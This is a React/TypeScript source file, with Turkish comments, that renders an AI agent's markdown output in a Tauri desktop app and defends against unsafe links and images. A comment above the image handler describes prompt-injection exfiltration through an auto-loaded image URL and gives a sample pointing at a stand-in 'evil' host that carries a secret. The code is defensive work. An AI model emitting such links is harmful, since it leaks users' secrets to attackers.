import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { openUrl } from "@tauri-apps/plugin-opener";

// AI çıktısını düz <pre> yerine zengin markdown olarak render eder
// (başlıklar, listeler, kod blokları, tablolar) → profesyonel görünüm.
export function MarkdownView({ text }: { text: string }) {
  return (
    <div className="markdown-body">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          // Hiçbir link WKWebView'ı uygulamanın dışına götürmesin: http(s) sistem
          // tarayıcısında açılır; göreli/file:/diğer şemalar (ajan çıktısındaki
          // `[x](src/a.rs)` gibi) tıklanınca hiçbir şey yapmaz — aksi halde pencere
          // tauri://localhost/src/a.rs'e gidip sohbet + React state kayboluyordu.
          // Yalnız sayfa içi `#anchor` varsayılan davranışta kalır.
          a: ({ href, children, ...props }) => {
            const isExternal = /^https?:\/\//i.test(href ?? "");
            const isAnchor = (href ?? "").startsWith("#");
            return (
              <a
                {...props}
                href={href}
                rel="noreferrer"
                onClick={
                  isAnchor
                    ? undefined
                    : (e) => {
                        e.preventDefault();
                        if (isExternal) void openUrl(href!);
                      }
                }
              >
                {children}
              </a>
            );
          },
          // Görseller otomatik YÜKLENMEZ: bağlam güvenilmeyen not/kod içeriğinden
          // geliyor; prompt injection `![](https://evil/?d=<sır>)` ile kullanıcı
          // hiçbir şeye tıklamadan veri sızdırabilirdi. Yerine yer tutucu metin;
          // http(s) ise kullanıcı isterse tıklayıp sistem tarayıcısında açar.
          img: ({ src, alt }) => {
            const url = typeof src === "string" ? src : "";
            const label = `[${alt || "image"}]`;
            if (!/^https?:\/\//i.test(url)) {
              return <span title={url || undefined}>{label}</span>;
            }
            return (
              <a
                href={url}
                title={url}
                rel="noreferrer"
                onClick={(e) => {
                  e.preventDefault();
                  void openUrl(url);
                }}
              >
                {label}
              </a>
            );
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
